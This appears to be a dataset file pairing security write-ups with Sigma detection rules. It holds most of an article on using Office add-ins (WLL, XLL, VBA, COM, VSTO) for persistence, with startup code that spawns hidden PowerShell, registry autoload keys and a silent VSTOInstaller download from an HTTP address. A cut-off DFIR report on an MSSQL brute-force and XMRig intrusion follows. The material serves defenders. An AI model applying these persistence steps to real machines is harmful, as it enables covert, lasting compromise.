apply to XLL add-ins.\n4. WLL add-ins are listed as being \"Inactive\" in Word's GUI for monitoring add-ins, despite actually being \"Active\". This does not apply to XLL add-ins.\n5. They can potentially be used for persistence in Virtual Desktop Infrastructure (VDI) environments.\n\n#### Disadvantages\n\n1. Dropping a DLL into \"%appdata%\".\n2. Registry edits are required for XLL add-ins.\n\n## VBA “Add-Ins” for Excel and PowerPoint\n\nSimilar to Word, both Excel and PowerPoint have an equivalent “StartUp” trusted location. In fact, they each have two – one that’s user-specific and one that’s system-wide. The user-specific trusted locations (as that’s where a low privilege user will have write permissions) are referred to as “XLSTART” and “AddIn” for Excel and PowerPoint respectively.\n\nThese trusted locations are not intended to store DLL-based add-ins, but instead ones that are VBA-based with a non-standard extension intended specifically for add-ins.\n\nThis particular persistence vector most closely aligns with Kostas’ work on template persistence. The key distinction between the two approaches is that when VBA is included within a template, it is only executed in documents that derive from that template. VBA add-ins will execute for their specific event handlers whenever any document is opened within Excel and PowerPoint regardless of their originating template, but this functionality is limited to these two Office applications.\n\nThe approach to implementing each persistence vector is described below.\n\n### Excel\n\nCreate a new Excel spreadsheet, open the VBA editor, and insert a \"Module\" which contains the persistence mechanism.\n\n```image\nAlt: VBA-EX-1\nDescription: The image depicts a screenshot of the Microsoft Visual Basic for Applications (VBA) editor. It shows a project named 'VBAProject' with various components such as 'Microsoft Excel Objects' and 'Modules'. The code pane displays a subroutine named 'Auto_Open', which creates an object of 'WScript.Shell' and executes a file named 'calc.exe'. This example illustrates a method for using VBA in Excel for executing code upon opening a spreadsheet, relevant to the concept of persistence mechanisms in cyber threats.\nTranscription: |\n  vba\n  Sub Auto_Open()\n      Set objShell = CreateObject(\"WScript.Shell\")\n      objShell.Exec (\"calc.exe\")\n  End Sub\n```\n\nGo to save the spreadsheet, but instead of choosing a standard Excel format choose select “Excel Add-In” from the type menu which uses “*.xlam” or “*.xla” depending on the compatibility mode. This should be saved to the appropriate trusted location which is typically “%appdata%\\Microsoft\\Excel\\XLSTART”.\n\n```image\nAlt: VBA-EX-2\nDescription: The image depicts a 'Save As' dialog box from Microsoft Excel, showing the file path to the XLSTART folder. It highlights the selected file name 'InconspicuousAddIn.xlam' with the file type set to 'Excel Add-In (*.xlam)'. This image illustrates the process of saving an Excel file as an add-in, which is relevant to creating persistence mechanisms in VBA for Excel.\nTranscription: |\n  Save As\n  \n  Roaming > Microsoft > Excel > XLSTART\n  \n  File name: InconspicuousAddIn.xlam\n  Save as type: Excel Add-In (*.xlam)\n  \n  Save | Cancel\n```\n\nWhen Excel is next opened the add-in will be executed regardless of whether it’s a new spreadsheet or one that’s been previously saved.\n\n### PowerPoint\n\nPowerPoint VBA Add-Ins can be created in the same manner as with Excel, but in this case the file format is \"*.ppam\" or \"*.ppa\". The add-in should then be stored in the appropriate Trusted Location, which as mentioned previously this is referred to as “AddIns” in the case of PowerPoint. It is also typically located at the rather generic looking location of “%appdata%\\Microsoft\\AddIns”, which is also used for the XLL add-ins.\n\nUnlike with Excel, PowerPoint add-ins are not automatically loaded but can be configured to through modifying the registry. Thankfully such modification only needs to occur in the HKEY_CURRENT_USER (HKCU) hive. This involves creating a key at the following location:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\AddIns\\<AddInName>\n```\n\nNote that the Office number may also need to be changed, and the 15.0 here refers to Office 2013. This key should then have the following properties. “Autoload” is set to “1” to indicate that it should load the add-in automatically when PowerPoint starts. A full “Path” to the add-in does not need to be provided as PowerPoint is aware of the location it is required to load add-ins from.\n\n```image\nAlt: VBA-PP-1\nDescription: The image displays a screenshot of the Windows Registry Editor, specifically a section related to PowerPoint add-ins. It shows the registry path for an add-in named 'InconspicuousAddIn.ppam' under the 'AddIns' directory. The registry keys include '(Default)', 'AutoLoad', and 'Path', with 'AutoLoad' set to '1', indicating that the add-in is configured to load automatically when PowerPoint starts. The structure and values depicted provide technical details relevant to configuring PowerPoint VBA add-ins.\nTranscription: |\n  Outlook\n    PowerPoint\n      AddInLoadTimes\n      AddIns\n        InconspicuousName\n  \n  Name          Type        Data\n  (Default)     REG_SZ      (value not set)\n  AutoLoad      REG_DWORD   0x00000001 (1)\n  Path          REG_SZ      InconspicuousAddIn.ppam\n```\n\n#### Benefits\n\n1. No administrative rights needed.\n2. Automatically loaded for Excel.\n3. \"Trusted Location\" so there are no problems executing VBA.\n4. Despite the file type being an “Add-In”, the “Disable all Application Add-Ins” option does not prevent the VBA code from executing.\n5. You can password protect the Add-In for viewing and editing – but it will still be executed.\n6. It can potentially be used for persistence in VDI environments.\n\n#### Disadvantages\n\n1. Having to endure the excruciating process of writing VBA code.\n2. In the case of PowerPoint VBA Add-Ins having to write to the registry.\n3. Dropping additional files to disk for both Excel and PowerPoint.\n\n## Office COM Add-Ins\n\nA wholly different way to create add-ins for Office is “COM add-ins”. Due to the manner in which COM add-ins work, it is possible to create a single add-in and have this integrated into all Office applications (including Outlook). For example, to run code when such Office programs open.\n\nCOM objects (which are stored as “*.dll” files, although are different from traditional DLLs) must be registered (in the registry) before use. Primarily this involves notifying Windows about the COM object (i.e., setting it up in the HKEY_CLASSES_ROOT hive). This registration process is defined in the function specified with a “ComRegisterFunctionAttribute” attribute.\n\nOffice applications must then be further configured to use this COM object which involves creating a single registry key with three properties. This key must be created per application. The registry key required to tell an Office program to load the COM add-in is stored at:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Program>\\Addins\\<AddInName>\n```\n\nIn this example, “3” for “LoadBehaviour” specifies that the Office application (here Outlook) should load the COM add-in at startup, and the COM add-in is referenced through a “FriendlyName”.\n\n```image\nAlt: COM-1\nDescription: The image displays a registry editor view showcasing the registry keys related to COM add-ins for Outlook. On the left side, it shows the 'Addins' folder with entries for various add-ins, including 'InconspicuousAddIn.Connect'. The right side displays the details of the selected add-in, including its 'Description', 'FriendlyName', and 'LoadBehavior' values, which indicate how the add-in is configured to behave within Outlook. This image is relevant to the context as it illustrates the registry settings necessary for deploying COM add-ins.\nTranscription: |\n  Outlook\n    Addins\n      AccessAddin.DC\n      ColleagueImport.ColleagueImportAddin\n      InconspicuousAddin.Connect\n      TelemetryAddin.Connect\n  \n  Name                  Type        Data\n  (Default)             REG_SZ      (value not set)\n  Description           REG_SZ      Outlook Inconspicuous Addin\n  FriendlyName          REG_SZ      Outlook Inconspicuous Addin\n  LoadBehavior          REG_DWORD   0x00000003 (3)\n```\n\nThe creation of the Office application keys can also be performed within the same function that is handling COM registration. A key benefit of this is allowing the actions to deploy the persistence mechanism to be bundled together thus reducing the number of commands that need to be run to set it up – in this case one using “regasm.exe”.\n\nWith regards to getting code execution once an Office application loads the COM object, a good location for this in the code is in the \"OnConnection\" function of the Office-specific \"IDTExtensibility2\" interface. This interface deals with add-in related events, such as for when an add-in is loaded (as with \"OnConnection\") and unloaded. The example below shows a hidden cmd window spawning calc.\n\n```\npublic void OnConnection(object application, Extensibility.ext_ConnectMode connectMode, object addInInst, ref System.Array custom)\n{\n    /* snip */\n    System.Diagnostics.Process process = new System.Diagnostics.Process();\n    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n    startInfo.FileName = \"powershell.exe\";\n    startInfo.Arguments = \"-ep bypass -C calc\";\n    process.StartInfo = startInfo;\n    process.Start();\n}\n```\n\nOnce the COM add-in has been created it can be deployed as follows using regasm.exe which invokes the registration function. This action requires administrative privileges as it writes to HKEY_CLASSES_ROOT.\n\n```image\nAlt: COM-3\nDescription: The image depicts a command prompt window displaying the output of a command used to register a .NET assembly with the Regasm utility. It shows the command executed, along with a warning indicating that registering an unsigned assembly may interfere with other applications. The output confirms that types were registered successfully. The command prompt is titled 'Administrator: Command Prompt', indicating it was run with administrative privileges.\nTranscription: |\n  C:\\>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe\" /codebase \"C:\\Users\\wk\\AppData\\Roaming\\Microsoft\\Office\\InconspicuousCOMAddIn.dll\"\n  \n  Microsoft .NET Framework Assembly Registration Utility version 4.0.30319.33440\n  for Microsoft .NET Framework version 4.0.30319.33440\n  Copyright (C) Microsoft Corporation. All rights reserved.\n  \n  RegAsm : warning RA0000 : Registering an unsigned assembly with /codebase can cause your assembly to interfere with\n  other applications that may be installed on the same computer. The /codebase switch is intended to be used only with\n  signed assemblies. Please give your assembly a strong name and re-register it.\n  \n  Types registered successfully\n```\n\nIn the example presented above, the add-in will be loaded when Outlook opens and we’ll be presented with calc.\n\n#### Benefits\n\n1. Easy to create a single add-in that works across multiple Office products without adaptation.\n2. One command to setup (regasm).\n\n#### Disadvantages\n\n1. Dropping the COM \"*.dll\" file to disk, and the registry edits required for it to be registered and automatically loaded.\n2. Requires administrative rights for COM registration.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## Excel Automation Add-In\n\nAs part of its intention to be extensible Excel allows the creation of user-defined functions. Such functions would be executed, for example, as part of cell formulae (where “=SUM()” is an example of a built-in function). These user-defined functions are stored in what is known as “Automation Add-Ins”. They’re created in a similar manner to COM Add-Ins, but have this specific use case.\n\nThere is a registration function as usual with COM, which can also include code to set up the registry to notify Excel that it should load this add-in at run time. This key required is located at:\n\n```\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\15.0\\Excel\\Options\n```\n\nEach Automation add-in is listed as the value of a single “OPENx” property, where x is an incrementing number if multiple add-ins are enabled at one time.\n\n```image\nAlt: AUTO1\nDescription: The image displays a screenshot of a Windows Registry Editor window showing the registry path related to Excel add-ins. It specifically highlights the 'Options' section under 'Excel' where an entry for 'OPEN' is listed. This entry indicates a user-defined function under the name 'InconspicuousAddIn.ExtFunctions'. The screenshot provides a visual representation of the registry settings that facilitate the use of Automation Add-Ins in Excel, making it relevant to the topic of persistence mechanisms.\nTranscription: |\n  plaintext\n  Excel\n    AddInLoadTimes\n    File MRU\n    Options\n    Place MRU\n  \n  Name           Type        Data\n  (Default)      REG_SZ      (value not set)\n  FirstRun       REG_DWORD   0x00000000 (0)\n  OPEN           REG_SZ      /A \"InconspicuousAddIn.ExtFunctions\"\n  OptionFormat   REG_BINARY  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n```\n\nIn terms of getting an Automation add-in to actually do something useful for the purposes of persistence, you define user-defined functions simply as standard functions within a particular namespace (here “InconspicuousAddIn”) and class (here “ExtFunctions”) which gets referenced in the above registry property. The function can do anything a normal function can, including executing arbitrary commands. The example below shows a user-defined function that counts the number of cells in a selected range after it opens calc.\n\n```\npublic double CountCellsRange(object range)\n{\n    System.Diagnostics.Process process = new System.Diagnostics.Process();\n    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n    startInfo.FileName = \"powershell.exe\";\n    startInfo.Arguments = \"-ep bypass -C calc\";\n    process.StartInfo = startInfo;\n    process.Start();\n\n    Excel.Range count = range as Excel.Range;\n    return count.Cells.Count;\n}\n```\n\nTo deploy the persistence mechanism, as Excel Automation add-ins are COM-based, regasm can be used once again using the same syntax as for the COM add-in. As can be seen below, post-regasm, the Automation add-in is now enabled:\n\n```image\nAlt: AUTO2\nDescription: The image shows a dialog box from Microsoft Excel displaying the 'Add-Ins' menu. It highlights the 'InconspicuousAddIn.ExtFunctions' as an enabled automation add-in. The dialog includes a list of available automation servers and indicates the file path for the add-in's DLL. The interface suggests interaction with user-defined functions in Excel, relevant to the context of creating persistence mechanisms using automation add-ins.\nTranscription: |\n  Top Window: Add-Ins\n  \n  Add-Ins available:\n  \n  ☑ Agptest  \n  ☑ Analysis ToolPak  \n  ☑ Analysis ToolPak - VBA  \n  ☑ InconspicuousAddin.ExtFunctions  \n  ☐ ZigZag  \n  \n               [OK] [Cancel] [Browse...] [Automation...]\n  \n  ---\n  \n  **Bottom Window: Automation Servers**\n  \n  _Title:_ **Automation Servers**\n  \n  Automation servers available:\n    HashedData Class\n    HNetCfg.NAT Traversal via UPnP Configuration Manager\n    HtmlDialog Class\n    HtmlDigestHelper Class\n    HNetCfg.FwMgr\n    HNetCfg.FwPolicy2\n    HNetCfg.HNetShare\n    HNetCfg.HNetCfgMgr\n    IETag Factory Class\n    IETag Factory\n    Image Rotation Class\n    IFilterGraph\n    InconspicuousAddin.ExtFunctions\n    Microsoft Uc Configuration Class\n    Microsoft UcDiagControl\n    Microsoft UcDiagControl for UcDiagnosticsInfo2\n    Microsoft UcDiagControl for UcMode category.\n  \n  (v) InconspicuousAddin.ExtFunctions\n  \n  ProgID: InconspicuousAddin.ExtFunctions  \n  C:\\Windows\\SysWow64\\uncscore.dll\n  \n             [OK] [Cancel] [Browse...]\n```\n\nOnce a user-defined function is integrated into Excel, an attacker would still need to find a way to have this command executed. Unfortunately, it doesn’t appear that you can overwrite built-in functions. Moreover, user-defined functions only execute when they are called, and will not execute again if they’ve previously been executed and the result is stored in a document.\n\nThe user-defined function therefore needs to be \"forcefully\" called, which can be done using VBA. This is not ideal, but arguably makes it harder for defenders to detect than when putting a full VBA persistence stager in a template or add-in – it’s less likely to draw suspicion as it could easily be interpreted as a standard Excel function. The following snippet of VBA is an example of how this could be achieved. When the workbook opens, a cell is selected (obviously in practice something other than 1:1 - A1), and its contents are replaced with the text string of the user-defined function call.\n\n```image\nAlt: AUTO3\nDescription: The image displays a snippet of VBA (Visual Basic for Applications) code within the context of an Excel add-in project. It shows a subroutine named 'Workbook_Open()' that sets the formula of a specific cell (A1) in 'Sheet1' to call a user-defined function, 'CountCellsRange(A1:A3)'. This is part of a discussion on how Automation add-ins can be used for persistence in Excel, illustrating how attackers might leverage Excel's functionality to execute arbitrary commands.\nTranscription: |\n  vb\n  Sub Workbook_Open()\n      Worksheets(\"Sheet1\").Cells(1, 1).Formula = \"=CountCellsRange(A1:A3)\"\n  End Sub\n```\n\n#### Benefits\n\n1. One command to setup (regasm).\n\n#### Disadvantages\n\n1. Requires administrative rights for COM registration.\n2. You still need a way of calling the user-defined function.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## VBE Add-Ins\n\nIt is possible to create a persistence mechanism that does not leverage VBA itself, but the development environment for creating it – the VBA editor (VBE). The documentation for creating VBE add-ins is scarce; however, it was found to be based on the now familiar COM object using Office’s \"IDTExtensibility2\" interface. Through this COM object, arbitrary code could be executed on, for example, the launch of the VBA editor. As COM is used once again, it can be deployed using regasm. This deployment includes the creation of the registry key to inform the VBA editor that it should automatically load the add-in. This key is stored at:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\VBE\\6.0\\Addins\\<VBEAddIn.Name>\n```\n\nThe key also contains a number of properties, which include a “FriendlyName” to refer to the registered COM object, and setting “LoadBehaviour” to “3” to inform the VBA editor to launch the add-in when the editor starts.\n\n```image\nAlt: VBE1\nDescription: The image displays a screenshot of a Windows Registry Editor view, showing a specific registry key path related to VBE add-ins in the context of Microsoft Office. It highlights the 'InconspicuousVBEAddIn.Connect' entry under the 'Addins' folder within the registry. The right side of the editor shows various properties associated with this registry entry, including 'CommandLineSafe', 'Description', 'FriendlyName', and 'LoadBehavior'. The 'LoadBehavior' is set to '3', indicating that the add-in is configured to load automatically when the VBA editor starts.\nTranscription: |\n  VBA\n    7.1\n      Trusted\n      VBE\n        6.0\n          Addins\n            InconspicuousVBEAddIn.Connect\n  \n  Name                  Type         Data\n  (Default)             REG_SZ       (value not set)\n  CommandLineSafe       REG_DWORD    0x00000000 (0)\n  Description           REG_SZ       An add-in that does inconspicuous things.\n  FriendlyName          REG_SZ       InconspicuousVBEAddIn\n  LoadBehavior          REG_DWORD    0x00000003 (3)\n```\n\nThe configured add-in can be seen within the VBA editor’s “Add-In Manager”.\n\n```image\nAlt: VBE2\nDescription: The image shows the 'Add-In Manager' interface from the VBA editor, displaying an add-in named 'InconspicuousVBEAddIn'. The add-in is marked as 'Startup / Loaded', indicating that it is configured to load automatically when the VBA editor starts. There is also a description stating, 'An add-in that does inconspicuous things.' The image highlights the options for load behavior, with checkboxes for 'Loaded/Unloaded' and 'Load on Startup' selected.\nTranscription: |\n  Add-In Manager\n  \n  Available Add-Ins                Load Behavior\n  InconspicuousVBEAddIn            Startup / Loaded\n  \n  Description\n  An add-in that does inconspicuous things.\n  \n  Load Behavior\n  [x] Loaded/Unloaded\n  [x] Load on Startup\n  [ ] Command Line\n  \n  [OK] [Cancel] [Help]\n```\n\n#### Benefits\n\n1. Easy to create a single add-in that works across multiple Office products without adaptation.\n2. One command to setup (regasm).\n\n#### Disadvantages\n\n1. Requires users to actually open the VBA editor!\n2. Requires administrative rights for COM registration.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## VSTO Add-Ins\n\nVisual Studio Tools for Office (VSTO) will also be covered here for the purposes of completeness. VSTO is the replacement for COM add-ins in newer versions of Office (although the latter is still supported). Unlike COM add-ins, however, VSTO requires a special runtime to be installed which is not installed by default.\n\nA suitable place for storing persistence commands is the default “ThisAddIn-Startup” function which is configured to handle startup events (e.g., when the module is loaded when the application starts). An example is shown below.\n\n```\nprivate void ThisAddIn_Startup(object sender, System.EventArgs e)\n{\n    System.Diagnostics.Process process = new System.Diagnostics.Process();\n    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n    startInfo.FileName = \"powershell.exe\";\n    startInfo.Arguments = \"-ep bypass -C calc\";\n    process.StartInfo = startInfo;\n    process.Start();\n}\n```\n\nThe problem with VSTO add-ins arises when it comes to deploying them. In part, this is due to the requirement for the special runtime. If this is not installed, and there are minimal requirements to avoid detective security controls (unlikely), it can be installed silently with no user interaction (\"vstor_redist.exe\" in the example below).\n\nThe VSTO add-in (“*.vsto”) can then be installed using a binary (“VSTOInstaller.exe”) which is part of the runtime.\n\n```image\nAlt: VSTO1\nDescription: The image displays a command prompt window showcasing a command for installing the VSTO (Visual Studio Tools for Office) runtime and a specific add-in. The command includes paths to the 'vstor_redist.exe' and 'VSTOInstaller.exe', as well as parameters for a silent installation process. This is relevant for understanding the deployment of VSTO add-ins, as discussed in the accompanying text.\nTranscription: |\n  C:\\>vstor_redist.exe /q /norestart\n  \n  C:\\>\"C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VSTO\\10.0\\VSTOInstaller.exe\" /I \"C:\\VSTO-AddIn\\WordAddIn.vsto\"\n```\n\nUnfortunately, this causes a pop-up requiring the user to confirm the installation. You can add a \"/s\" for silent but the project needs to be signed by a trusted publisher or it will default to “Don't Install” and silently fail.\n\n```image\nAlt: VSTO2\nDescription: The image shows a pop-up window titled 'Microsoft Office Customization Installer.' The window indicates that the publisher of the add-in cannot be verified, raising a security warning. It displays the name of the add-in ('WordAddIn5'), its source file path, and notes that the publisher is 'Unknown Publisher.' The user is prompted with two options: 'Install' and 'Don't Install,' accompanied by a warning that untrusted customizations could harm the computer.\nTranscription: |\n  Microsoft Office Customization Installer\n  \n  Publisher cannot be verified\n  \n  Are you sure you want to install this customization?\n  \n  Name:        WordAddIn5\n  From:        file:///c:/VSTO-AddIn/WordAddIn5.vsto\n  Publisher:   Unknown Publisher\n  \n  While Office customizations can be useful, they can potentially harm your computer. If you do not trust the source, do not install this software. More Information...\n  \n  [Install] [Don't Install]\n```\n\nInterestingly \"VSTOInstaller.exe\" is a Microsoft signed binary and the location of the add-in can be specified as a URL (e.g., \"VSTOInstaller.exe /s /i http://192.168.7.129/OutlookAddIn1.vsto\"). Initially, this seems interesting as a potential application whitelisting bypass if a signed VSTO add-in is used. Unfortunately, Window’s trust model would restrict this. Although a user (or at least the organisation’s system administration team) may trust many certification authorities within the “Trusted Root” store, this trust is not implicitly extended to allow them to “publish” updates to software, and instead, there is a separate “Trusted Publisher” store for this which certification authorities have to be explicitly enabled in.\n\n#### Benefits\n\n1. Runtime installer (\"VSTOInstaller.exe\") is an MS signed binary, and can download (silently) the add-in over HTTP, although it needs to be from a trusted publisher.\n\n#### Disadvantages\n\n1. Requires non-standard VSTO runtime.\n2. Can't install silently without being signed by a trusted publisher, although a user might manually install it given that it’s an add-in for a trusted program.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## Defending Against Malicious Add-Ins\n\nMalicious XLL, COM, Automation, and VSTO add-ins can easily be prevented through disabling add-ins within each Office application’s Trust Center (or through the appropriate registry keys).\n\n```image\nAlt: DEF1\nDescription: The image is a screenshot of the Trust Center settings in a Microsoft Office application. It shows the options available for managing add-ins, specifically highlighting the option to 'Disable all Application Add-ins (may impair functionality)' which is currently checked. The panel also includes options related to trusted publishers, trusted locations, and notifications for unsigned add-ins.\nTranscription: |\n  Trust Center\n  \n  Add-ins\n  \n  [ ] Require Application Add-ins to be signed by Trusted Publisher\n  \n  [ ] Disable notification for unsigned add-ins (code will remain disabled)\n  \n  [x] Disable all Application Add-ins (may impair functionality)\n```\n\nAlternatively, if add-ins are required, it is recommended they are required to be signed by a trusted publisher, and that user notifications are disabled. The user notifications that are presented when untrusted add-ins are used provide limited warning against potential security risk, and users may enable the content, especially if they’re opening a previously trusted document (e.g., one they’ve created). An example of a user notification is provided below.\n\n```image\nAlt: DEF2\nDescription: The image displays a security warning message from a Microsoft Office application. It indicates that some active content has been disabled and prompts the user to enable content for further interaction. This warning is relevant to the context of malicious add-ins, highlighting the importance of user awareness regarding the potential risks of enabling such content.\nTranscription: |\n  FILE  HOME  INSERT  DESIGN  PAGE LAYOUT  REFERENCES  MAILINGS  REVIEW  VIEW\n  \n  SECURITY WARNING  Some active content has been disabled. Click for more details.  Enable Content\n```\n\nAlthough the WLL and VBA add-ins self-define as add-ins, they’re not affected by the above Trust Center setting. This is particularly surprising in the case of WLL add-ins given it’s a DLL-based add-in.\n\nThe most effective way to mitigate against the risk of malicious WLL and VBA add-ins is to remove the “StartUp” trusted locations for each if they are not used. If they are required, at least for Excel and PowerPoint consider putting the required add-ins in the system-wide trusted location for this purpose, and removing the trusted location that exists within the user profile. This would force an attacker to escalate their privileges in order to use the system-wide location as a persistence mechanism. In both cases, organisations could also look to ensure that appropriate access control lists are established for the trusted locations in order to prevent users from adding or editing existing files.\n\nIt is further recommended that organisations look to develop a detective capability around identifying malicious add-ins. Three core aspects to this involve examining and validating the file system contents of the trusted locations, auditing the registry entries relevant for enabling add-ins, and monitoring for non-standard process relationships (e.g., examining the processes spawned by Office applications).",
    "sigma_rule": {
      "title": "Potential Persistence Via Excel Add-in - Registry",
      "id": "961e33d1-4f86-4fcf-80ab-930a708b2f82",
      "status": "test",
      "description": "Detect potential persistence via the creation of an excel add-in (XLL) file to make it run automatically when Excel is started.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md",
        "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence"
      ],
      "author": "frack113",
      "date": "2023-01-15",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1137.006"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "Software\\Microsoft\\Office\\",
          "TargetObject|endswith": "\\Excel\\Options",
          "Details|startswith": "/R ",
          "Details|endswith": ".xll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_xll.yml",
    "id": "1007"
  },
  {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer\n\n**Categories:** coinminer, exploit \n**Published Date:** July 11, 2022 \n\n---\n\nIn March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting.\n\nUS CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link).\n\n---\n\n## Summary\n\nOver the month of March, we observed a cluster of activity targeting MSSQL servers. The activity started via password brute force attempts for the MSSQL SA account. These brute force attempts were observed repeatedly over the month. Examples included one cluster of 24,000 failed attempts from the same source, over a 27-hour effort, before they finally managed to guess the password. After obtaining the correct credentials, the attackers spawned a command shell via `xp_cmdshell`. According to Microsoft documentation, `xp_cmdshell` spawns a Windows command shell and passes in a string for execution.\n\nUsing `xp_cmdshell`, the threat actors were able to execute any command against the compromised server. They attempted to kill a bunch of AV programs by using `taskkill.exe`. The threat actors then wrote multiple commands to a batch file by using `echo` and redirecting the strings to a file named `1.bat`. After the batch file was written, they proceeded to perform the same action echoing data into a file named `bigfile.txt`. After finishing writing to that file, they ran `certutil` to decode the base64 data into an executable file. This executable was a privilege escalation tool used to execute the batch file to ensure it executed with high enough permissions. They then executed the batch script. The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.\n\nOnce the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner. They dropped a Binary Managed Object Format (BMOF) file along with the miner itself to achieve this. The threat actors used `mofcomp.exe` to decompile the BMOF binary and register a malicious class in the WMI repository. The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.\n\nNo other activity beyond the mining was observed before the threat actors were evicted.\n\n---\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, Sliver, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nArtifacts for this case are limited due to the environment. A few log sources are available for this case under our Security Researcher and Organization services.\n\n---\n\n## Initial Access\n\nThe initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.\n\nDuring the intrusions, we could see SQL Server event ID **18456** Failure Audit Events in the Windows application logs. We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.\n\n### Example of the failed brute force attempts:\n\n```image\nAlt: Failed Attempts\nDescription: The image displays a series of failed login attempts to a SQL Server, showing usernames and the corresponding reasons for failure. Each entry indicates whether the password did not match or the login could not be found. The usernames include common administrative names like 'sa' and 'admin,' highlighting potential brute force attack attempts.\nTranscription: |\n  sa | Reason: Password did not match that for the login provided. |\n  hbv7 | Reason: Could not find a login matching the name provided. |\n  su | Reason: Could not find a login matching the name provided. |\n  ps | Reason: Could not find a login matching the name provided. |\n  vice | Reason: Could not find a login matching the name provided. |\n  kisadmin | Reason: Could not find a login matching the name provided. |\n  401hk | Reason: Could not find a login matching the name provided. |\n  sysdba | Reason: Could not find a login matching the name provided. |\n  admin | Reason: Password did not match that for the login provided. |\n  uep | Reason: Could not find a login matching the name provided. |\n  bizbox | Reason: Could not find a login matching the name provided. |\n  neterp | Reason: Could not find a login matching the name provided. |\n  unierp | Reason: Could not find a login matching the name provided. |\n  sp | Reason: Could not find a login matching the name provided. |\n  root | Reason: Password did not match that for the login provided. |\n  bwsa | Reason: Could not find a login matching the name provided. |\n```\n\n### Followed by eventual successful logins:\n\n```image\nAlt: Successful Logins\nDescription: The image depicts a table displaying SQL Server audit events. It includes columns such as 'TimeWritten,' 'EventID,' 'EventTypeName,' 'EventCategory,' 'SourceName,' and 'Strings,' showing multiple entries for successful audit events. The entries indicate the timestamps of the events, the event type as 'Success Audit event,' and the source name as 'MSSQL$SQLEXPRESS,' suggesting automated access attempts by the threat actor.\nTranscription: |\n  | TimeWritten      | EventID | EventT | EventTypeName       | EventC | SourceName       | Strings       |\n  | ---------------- | ------- | ------ | ------------------- | ------ | ---------------- | ------------- |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:01 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n```\n\nIt is likely that multiple successful logins were observed due to the automated access script that the threat actor was using.\n\n---\n\n## Execution\n\nIn the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (`xp_cmdshell`). This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.\n\n### Example of command execution following a successful authentication to SQL database using `xp_cmdshell`:\n\n```\nEXEC xp_cmdshell 'whoami'\n```\n\nAt a high level, the overall execution events can be depicted in the below diagram:\n\n```image\nAlt: Execution Diagram\nDescription: The image is a flow diagram illustrating the execution events following a successful brute-force attack against a SQL Server. It details the steps from authentication via brute force, the use of the command shell via `xp_cmdshell`, writing various scripts and files to disk, compiling a MOF file, and killing antivirus processes. The diagram includes visual elements like boxes and arrows showing the progression of actions taken by threat actors, such as adding local administrator accounts and setting up a scheduled task for running XMRig CoinMiner.\nTranscription: |\n  START\n    Brute-Force Attack Against SQL Server\n      Successful Authentication via Brute Force Attack\n        Command Shell via xp_cmdshell\n          Writes 1.bat, and bigfile.txt to disk\n            decodes bigfile.txt with certutil into bigfile.exe\n              bigfile.exe used to run 1.bat\n                1.bat performs the following\n                  Adding Local Administrator Accounts\n                  Hiding New Local Admin Accounts\n                  Enables RDP\n                  Enables Widget\n          Writes kit.bat to disk\n            Running XMRig CoinMiner\n              Creating scheduled task for CoinMiner\n      Compiling BMOF file\n        Adding a new class/ MyASEventConsumer in WMI repository\n          EventConsumer (Script or executable to run)\n            Creates persistence\n            Download/executes VBE script\n              - Random Name\n              - Executes every day at 23:00\n          EventFilter (Trigger condition)\n          Binding (Tie together Filter + Consumer)\n    Kills AV Processes\n```\n\nIf we look into the Windows Application logs, specifically, the SQL Server event ID 15457 